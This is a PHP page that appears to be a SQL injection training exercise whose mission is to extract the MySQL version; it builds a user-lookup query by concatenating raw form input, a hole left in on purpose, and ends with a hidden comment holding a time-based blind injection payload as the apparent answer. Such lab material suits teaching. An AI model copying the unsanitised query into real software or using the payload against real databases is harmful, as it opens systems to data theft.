<?php
require_once '../global.php';
require_once '../header.php';
require_once '../db.php';

echo '
<h5><u>* Mission: get mysql version.</u></h5>
<form action="" method="POST">
Check is user exist: <input type="text" name="username" value="">
  <input type="submit">
</form>
<br>
';

if (isset($_POST['username']))
{
	$user_name = $_POST['username'];
	$con=mysqli_connect($host, $username, $password, $database);
	// Check connection
	if (mysqli_connect_errno())
	{
	echo "Failed to connect to MySQL: " . mysqli_connect_error();
	die();
	}
	
	$sQuery = "SELECT * FROM `users` where `user_name` = '" .$user_name. "'";
	$result = mysqli_query($con,$sQuery);

	$num = mysqli_num_rows($result);
	
	if( $num > 0 ) {
		echo 'Username exists in the system';
	}
	else{
		echo 'Username does not exists in the system';
	}
	
	mysqli_close($con);
	
	echo "<p><b>Executing query: </b>".htmlentities($sQuery)."</p>";
}

require_once '../footer.php';
?>

<!--
aa' or if((select version()) like '10%',sleep(2), null)#
 -->